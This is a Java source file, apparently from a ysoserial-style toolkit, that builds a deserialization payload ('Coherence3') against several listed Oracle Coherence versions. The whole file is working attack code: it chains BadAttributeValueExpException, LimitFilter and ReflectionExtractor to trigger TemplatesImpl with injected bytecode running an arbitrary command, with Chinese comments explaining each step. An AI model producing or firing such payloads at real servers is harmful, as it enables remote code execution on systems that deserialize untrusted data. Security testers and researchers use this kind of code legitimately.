package payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import java.io.InputStream;
import java.lang.reflect.Field;

import static util.Transformers.insertCommand;

/*
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 */

@Dependencies({"coherence:3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0"})
@Authors({ Authors.CCKUAILONG })
public class Coherence3 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		//初始化TemplatesImpl实例
		TemplatesImpl temp = new TemplatesImpl();
		InputStream in = Thread.currentThread().getContextClassLoader().getResourceAsStream("template/ExecTemplateJDK8.class");
		byte[] PayByte = insertCommand(in, command);
		//将payload字节码放入_bytecodes属性
		Class clz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
		Field ByteCode = clz.getDeclaredField("_bytecodes");
		ByteCode.setAccessible(true);
		ByteCode.set(temp,new byte[][]{PayByte});
		//_name不为空即可
		Field name = clz.getDeclaredField("_name");
		name.setAccessible(true);
		name.set(temp,"tr1ple");

		//定义单次反射要调用的方法
		ValueExtractor valueExtractor = new ReflectionExtractor("getOutputProperties", new Object[0]);
		//构造LimitFilter实例，并将temp放入
		LimitFilter limitFilter = new LimitFilter();
		limitFilter.setTopAnchor(temp);
		BadAttributeValueExpException expException = new BadAttributeValueExpException(null);

		Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
		m_comparator.setAccessible(true);
		m_comparator.set(limitFilter, valueExtractor);

		Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
		m_oAnchorTop.setAccessible(true);
		m_oAnchorTop.set(limitFilter, temp);

		Field val = expException.getClass().getDeclaredField("val");
		val.setAccessible(true);
		val.set(expException, limitFilter);

		return expException;
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(Coherence3.class, command, fusion);
	}
}
